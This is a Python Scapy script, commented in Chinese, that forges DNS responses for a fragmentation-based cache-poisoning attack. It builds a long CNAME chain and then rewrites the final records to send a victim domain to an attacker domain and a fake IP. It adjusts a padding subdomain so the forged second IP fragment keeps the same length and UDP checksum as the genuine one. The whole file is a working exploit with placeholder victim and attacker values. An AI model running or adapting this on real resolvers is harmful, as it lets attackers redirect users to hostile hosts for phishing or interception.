import uuid
from scapy.all import IP, UDP, Raw, fragment, DNS, DNSQR, DNSRR, raw
import random
import struct
import socket # 需要用 inet_aton

SRC_IP = "10.0.0.3"
DST_IP = "10.0.0.2"
SRC_PORT = 53
# DST_PORT = random.randint(0, 65535)
DST_PORT = 53
MTU = 1500
IP_HEAD = 20
UDP_HEAD = 8
PAYLOAD = MTU - IP_HEAD - UDP_HEAD


def _build_standard_response(
        qname: bytes, 
        prefix:bytes, 
        victim:bytes,
        origin_ip:str,
        length:int 
        ) -> bytes:
    request = DNS(qd=DNSQR(qname=qname))
    answer_records_list = []
    answer_records_list.append(DNSRR(rrname=qname, ttl=3600, type='CNAME', rdata=f"{prefix.decode()}0.{victim.decode()}".encode()))
    for i in range(length):
        answer_records_list.append(DNSRR(rrname=f"{prefix.decode()}{i}.{victim.decode()}".encode(), ttl=3600, type='CNAME', rdata=f"{prefix.decode()}{i+1}.{victim.decode()}".encode()))
    answer_records_list.append(DNSRR(rrname=f"{prefix.decode()}{length}.{victim.decode()}".encode(), ttl=3600, type='A', rdata=origin_ip))

    ancount_val = len(answer_records_list)
    dns_header = DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, ancount=ancount_val)
    header_bytes = raw(dns_header)
    answer_bytes = b"".join([raw(rec) for rec in answer_records_list])
    return header_bytes + answer_bytes

def _build_origin_fake_response(
        qname: bytes,
        prefix:bytes, 
        victim:bytes,
        origin_ip:str,
        attacker:bytes,
        fake_ip:str,
        length:int,
        subdomain: str) -> bytes:
    request = DNS(qd=DNSQR(qname=qname))
    answer_records_list = []
    answer_records_list.append(DNSRR(rrname=qname, ttl=3600, type='CNAME', rdata=f"{prefix.decode()}0.{victim.decode()}".encode()))
    for i in range(length):
        answer_records_list.append(DNSRR(rrname=f"{prefix.decode()}{i}.{victim.decode()}".encode(), ttl=3600, type='CNAME', rdata=f"{prefix.decode()}{i+1}.{victim.decode()}".encode()))
    answer_records_list.append(DNSRR(rrname=f"{prefix.decode()}{length}.{victim.decode()}".encode(), ttl=3600, type='A', rdata=origin_ip))

    answer_records_list[-1].rrname = f"{attacker.decode()}".encode()
    answer_records_list[-1].rdata = fake_ip
    answer_records_list[-2].rdata = f"{attacker.decode()}".encode()
    answer_records_list[-2].rrname = f"{subdomain}.{victim.decode()}".encode()
    answer_records_list[-3].rdata = f"{subdomain}.{victim.decode()}".encode()
    # answer_records_list[-1].rrname = f"d{CHAIN_LENGTH}.{ATTACKER_DOMAIN.decode()}".encode()
    # answer_records_list[-2].rdata = f"d{CHAIN_LENGTH}.{ATTACKER_DOMAIN.decode()}".encode()
    # answer_records_list[-5].rrname = f"b{CHAIN_LENGTH - 4}.{ATTACKER_DOMAIN.decode()}".encode()
    # answer_records_list[-6].rdata = f"b{CHAIN_LENGTH - 4}.{ATTACKER_DOMAIN.decode()}".encode()

    ancount_val = len(answer_records_list)
    dns_header = DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, ancount=ancount_val)
    header_bytes = raw(dns_header)
    answer_bytes = b"".join([raw(rec) for rec in answer_records_list])
    return header_bytes + answer_bytes



def build_fake_respones(
        qname: bytes, 
        prefix: bytes, 
        victim: bytes, 
        origin_ip: str,
        attacker: bytes, 
        fake_ip: str, 
        length:int = 55
                        ) -> bytes:
    print("-----------------------")
    print(f"[INFO] qname: {qname.decode()}")
    print(f"[INFO] prefix: {prefix.decode()}")
    print(f"[INFO] victim: {victim.decode()}")
    print(f"[INFO] victim ip: {origin_ip}")
    print(f"[INFO] attacker: {attacker.decode()}")
    print(f"[INFO] fake ip: {fake_ip}")
    print(f"[INFO] cname chain: {length}")
    print("-----------------------")
    origin = _build_origin_fake_response(qname, prefix, victim, origin_ip, attacker, fake_ip, length, "x")
    std = _build_standard_response(qname, prefix, victim, origin_ip, length)
    ckm1, len1 = check(std)
    ckm2, len2 = check(origin)
    _iter = 0
    sub = None
    while len1 != len2:
        if _iter >= 2:
            raise ValueError("[ERROR] can't make length equal")
        print("[WARN] length not equal!!!")
        print(f"[INFO] byte1: {len1} bytes")
        print(f"[INFO] byte2: {len2} bytes")
        if len1 < len2:
            raise ValueError("[ERROR] can't modify domain because length increase")
        elif ((len1 - len2) % 2 != 0):
            raise ValueError("[ERROR] odd length difference should not exist")
        sub = "x" + "x" * ((len1 - len2) // 2)
        print(f"[INFO] the subdomain is {sub}")
        origin = _build_origin_fake_response(qname, prefix, victim, origin_ip, attacker, fake_ip, length, sub)
        ckm2, len2 = check(origin)
        _iter += 1
    _iter = 0
    print("[INFO] length equal")
    while ckm1 != ckm2:
        if _iter >= 2:
            raise ValueError("[ERROR] can't make checksum equal")
        print("[WARN] checknum not equal!!!")
        print(f"[INFO] byte1: {ckm1}")
        print(f"[INFO] byte2: {ckm2}")
        pos = find(origin, sub)
        print(f"[INFO] the pos is {pos}")
        new_sub = fake(ckm1, ckm2, sub, pos)
        origin = _build_origin_fake_response(qname, prefix, victim, origin_ip, attacker, fake_ip, length, new_sub)
        ckm2, len2 = check(origin)
        print(f"[INFO] the new subdomain is {new_sub}")
        _iter += 1
    print("[INFO] check: ")
    eq = cmp(std, origin)
    if eq:
        print("[INFO] terminated")
    else:
        raise ValueError("[ERROR] please re-choose your victim-domain")
    print(f"[INFO] final check: ")
    std_checksum = checksum(SRC_IP, DST_IP, SRC_PORT, DST_PORT, std)
    fake_checksum = checksum(SRC_IP, DST_IP, SRC_PORT, DST_PORT, origin)
    if std_checksum == fake_checksum:
        print(f"[INFO] final check pass!!!")
    else:
        raise ValueError(f"[ERROR] final check failed!!!")
    
    return origin
        

def check(bytes: bytes) -> tuple[int]:
    second_packet = bytes[PAYLOAD: ]
    if len(second_packet) % 2 != 0:
        second_packet += b'\x00'
    total_sum = 0
    for i in range(0, len(second_packet), 2):
        # 从字节流中解包出一个16位的无符号短整型
        word = struct.unpack('!H', second_packet[i:i+2])[0]
        total_sum += word
    return total_sum, len(second_packet)

def cmp(byte1: bytes, byte2: bytes) -> bool:
    ckm1, len1 = check(byte1)
    ckm2, len2 = check(byte2)
    if len1 != len2:
        print("[ERROR] length not equal!!!")
        print(f"[INFO] byte1: {len1} bytes")
        print(f"[INFO] byte2: {len2} bytes")
        return False
    if ckm1 != ckm2:
        print("[ERROR] checknum not equal!!!")
        print(f"[INFO] byte1: {ckm1}")
        print(f"[INFO] byte2: {ckm2}")
        return False
    print("[INFO] check pass!!!")
    return True

def contribute(data_str: str, pos: tuple, encoding: str = 'utf-8') -> int:
    byte_list = data_str.encode(encoding)
    total_sum = 0
    for i, byte_val in enumerate(byte_list):
        factor = 0
        for p in pos:
            if (i + p - 1) % 2 == 0:
                factor += 256  # 高位字节
            else:
                factor += 1   # 低位字节
        total_sum += byte_val * factor
    return total_sum

ALPHANUMERIC_BYTES = set(
    list(range(ord('0'), ord('9') + 1)) +
    list(range(ord('A'), ord('Z') + 1)) +
    list(range(ord('a'), ord('z') + 1))
)

def fake(std: int, now: int, data_str: str, pos: tuple, encoding="utf-8") -> str:
    total_delta = std - now
    
    if total_delta == 0:
        return data_str

    original_bytes = list(data_str.encode(encoding))
    n_bytes = len(original_bytes)
    modified_bytes = original_bytes[:]

    # 检查原始字符串是否合法
    for byte_val in original_bytes:
        if byte_val not in ALPHANUMERIC_BYTES:
            raise ValueError(f"原始字符串 '{data_str}' 包含非字母数字字符，无法进行伪造。")

    factors = [0] * n_bytes
    for i in range(n_bytes):
        factor = 0
        for p in pos:
            if (i + p - 1) % 2 == 0:
                factor += 256
            else:
                factor += 1
        factors[i] = factor

    remaining_delta = total_delta
    for i in range(n_bytes):
        if remaining_delta == 0:
            break
        
        factor = factors[i]
        if factor == 0:
            continue
            
        ideal_change = remaining_delta // factor
        
        # --- 新的核心逻辑：寻找合法的 actual_change ---
        actual_change = 0
        current_byte_val = modified_bytes[i]

        if ideal_change > 0:
            # 从 ideal_change 向下搜索到 1
            for c in range(ideal_change, 0, -1):
                if (current_byte_val + c) in ALPHANUMERIC_BYTES:
                    actual_change = c
                    break
        elif ideal_change < 0:
            # 从 ideal_change 向上搜索到 -1
            for c in range(ideal_change, 0, 1):
                if (current_byte_val + c) in ALPHANUMERIC_BYTES:
                    actual_change = c
                    break
        # ---------------------------------------------
        
        if actual_change != 0:
            modified_bytes[i] += actual_change
            remaining_delta -= actual_change * factor
        
    if remaining_delta != 0:
        raise ValueError(
            f"无法伪造和。在字母数字约束下，修改'{data_str}'后仍有 {remaining_delta} 的差值无法弥补。"
        )
    return bytes(modified_bytes).decode(encoding, errors='ignore')


def find(bytes: bytes, search_str: str, encoding: str = "utf-8") -> tuple[int, ...]:
    try:
        search_bytes = search_str.encode(encoding)
        if not search_bytes:
            return tuple()

        positions = []
        current_offset = 0
        
        while True:
            found_index = bytes.find(search_bytes, current_offset)
            if found_index == -1:
                break
            
            if found_index % 2 == 0:
                positions.append(1)
            else:
                positions.append(2)
            current_offset = found_index + 1
        return tuple(positions)
    except Exception as e:
        print(f"[ERROR] when catch pos: {e}")
        raise


def checksum(src_ip, dst_ip, src_port, dst_port, udp_payload):
    pseudo_header = (
        socket.inet_aton(src_ip) +
        socket.inet_aton(dst_ip) +
        b'\x00' +
        b'\x11' + # 协议号 17 for UDP
        struct.pack('!H', 8 + len(udp_payload)) # UDP头部(8) + 负载长度
    )

    # b. 构建用于计算的UDP头部 (8字节)
    #    源端口 + 目的端口 + 长度 + 校验和(置0)
    udp_header_for_calc = (
        struct.pack('!H', src_port) +
        struct.pack('!H', dst_port) +
        struct.pack('!H', 8 + len(udp_payload)) +
        b'\x00\x00' # 校验和字段在计算时必须为0
    )
    # c. 拼接所有数据
    data_to_sum = pseudo_header + udp_header_for_calc + udp_payload
    
    # d. 如果数据长度为奇数，末尾补一个0字节
    if len(data_to_sum) % 2 != 0:
        data_to_sum += b'\x00'
        
    # e. 以16位(2字节)为单位进行累加
    total_sum = 0
    for i in range(0, len(data_to_sum), 2):
        # 从字节流中解包出一个16位的无符号短整型
        word = struct.unpack('!H', data_to_sum[i:i+2])[0]
        total_sum += word
        
    # f. 处理溢出位：将高16位加到低16位上，直到高16位为0
    while (total_sum >> 16):
        total_sum = (total_sum & 0xFFFF) + (total_sum >> 16)
        
    # g. 取反码，得到最终校验和
    checksum = ~total_sum & 0xFFFF
    
    return checksum


if __name__ == "__main__":
    sub = uuid.uuid4().hex[:8]
    prefix = b'c'
    victim = b'example.com'
    attacker = b'acc.com'
    ip = '1.1.1.1'
    fake_ip = '9.9.9.9'
    qname = f"{sub}.{victim.decode()}".encode()
    build_fake_respones(qname, prefix, victim, ip, attacker, fake_ip)